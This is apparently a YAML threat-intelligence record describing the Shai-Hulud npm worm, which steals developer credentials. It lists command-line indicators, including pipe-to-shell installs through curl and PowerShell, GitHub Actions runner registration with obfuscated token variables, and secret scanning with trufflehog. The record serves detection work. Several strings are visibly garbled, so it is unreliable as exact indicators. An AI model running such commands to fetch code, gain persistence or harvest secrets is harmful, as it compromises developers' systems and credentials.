description: Shai-Hulud is a self-replicating npm worm that steals developer credentials
  and publishes them to public repositories, using the Bun runtime to evade detection.
malware_families:
- Shai-Hulud
TTPs:
  processes:
  - powershell.exe
  - curl
  - bash
  - trufflehog.exe
  commandline:
  - powershell -c irm bun.sh/install.psl|iex"";
  - curl -sSL https://bun.sh/install | bash
  - ./config.sh --url https://github.com/${0x349291}/${0x2bla39} --unattended -token ${_0x148%ecc} --name "SRAIRULUD"
  - powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri actions-runner-win-x64-2.330.0.zip"
  - powershell -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::ExtractToDirectory (\"actions-runner-win-x64-2.330.0.zip\, \".\") "
  - ./config.cmd --url https://github.com/${ 0x349291}/${ 0x2bla39} --unattended -tokem ${_ 0x148%ecc} --name "SEAIHULUD"
  powershell:
  - Invoke-WebRequest -Uri actions-runner-win-x64-2.330.0.zip
  - Add-Type -AssemblyName System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::ExtractToDirectory
    (\"actions-runner-win-x64-2.330.0.zip\, \".\")
  scripting_engine:
  - JavaScript
  registry_keys: []
  image_load: []
  network_connections:
  - curl.exe
  - https://github.com/actions/runner/releases/download/v2.330.0
  - https://api.github.com/repos/trufflesecurity/trufflehog/releases/latest
  file_activity:
  - Setup_bun.js
  - Bun_environment.js
  - /actions-runner-linux-x64-2.330.0.tar.gz
  - ./config.sh
  - actions-runner-win-x64-2.330.0.zip
  - ./config.cmd
  - trufflehog.exe
  persistence:
  - GitHub Actions self-hosted runner registration
  process_relations: []
